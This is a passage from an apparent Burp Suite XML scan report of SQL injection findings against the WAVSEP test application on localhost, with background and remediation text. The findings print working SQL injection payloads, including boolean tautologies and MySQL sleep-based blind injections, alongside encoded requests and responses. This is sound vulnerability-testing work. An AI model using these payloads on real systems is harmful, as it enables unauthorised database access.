      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMS1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1CbGluZC0yMDBWYWxpZFJlc3BvbnNlV2l0aERlZmF1bHRPbkV4Y2VwdGlvbi5qc3A/dHJhbnNhY3Rpb25JZD0xMzM4MDI3MjMxNSUyMG9yJTIwNDc4MyUzZDQ3OTEgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBJZGVudGljYWwvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MzMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGVmYXVsdCB2YWxpZCByZXNwb25zZSBvbiBleGNlcHRpb248L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMS1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1CbGluZC0yMDBWYWxpZFJlc3BvbnNlV2l0aERlZmF1bHRPbkV4Y2VwdGlvbi5qc3A/dHJhbnNhY3Rpb25JZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBJZGVudGljYWwvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjEwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MzMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGVmYXVsdCB2YWxpZCByZXNwb25zZSBvbiBleGNlcHRpb248L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7445197903322807296</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>79904392' or '9641'='9641</b> and <b>70709644' or '5718'='5727</b> were each submitted in the username parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMi1JbmplY3Rpb25JblZpZXctU3RyaW5nLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcD91c2VybmFtZT11c2VyMTc5OTA0MzkyJyUyMG9yJTIwJzk2NDEnJTNkJzk2NDEgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBJZGVudGljYWwvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NDMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkZWZhdWx0IHZhbGlkIHJlc3BvbnNlIG9uIGV4Y2VwdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgoKVGhlIGxpc3Qgb2YgdXNlcnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpVc2VySWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpVc2VyTmFtZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxCjwvVEQ+CjxURD4KdXNlcjEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpkYXZpZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CmFkbWluCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0CjwvVEQ+CjxURD4KdXNlcjQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjUKPC9URD4KPFREPgp1c2VyNQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNgo8L1REPgo8VEQ+CnVzZXI2CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo3CjwvVEQ+CjxURD4KdXNlcjcKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMi1JbmplY3Rpb25JblZpZXctU3RyaW5nLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcD91c2VybmFtZT11c2VyMTcwNzA5NjQ0JyUyMG9yJTIwJzU3MTgnJTNkJzU3MjcgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBJZGVudGljYWwvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkZWZhdWx0IHZhbGlkIHJlc3BvbnNlIG9uIGV4Y2VwdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgoKVGhlIGxpc3Qgb2YgdXNlcnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpVc2VySWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpVc2VyTmFtZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMi1JbmplY3Rpb25JblZpZXctU3RyaW5nLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcD91c2VybmFtZT11c2VyMSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmInIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjEwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NDMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkZWZhdWx0IHZhbGlkIHJlc3BvbnNlIG9uIGV4Y2VwdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgoKVGhlIGxpc3Qgb2YgdXNlcnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpVc2VySWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpVc2VyTmFtZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxCjwvVEQ+CjxURD4KdXNlcjEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpkYXZpZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CmFkbWluCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0CjwvVEQ+CjxURD4KdXNlcjQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjUKPC9URD4KPFREPgp1c2VyNQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNgo8L1REPgo8VEQ+CnVzZXI2CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo3CjwvVEQ+CjxURD4KdXNlcjcKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5073690008257482752</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>' and '6843'='6843</b> and <b>' and '4397'='4400</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
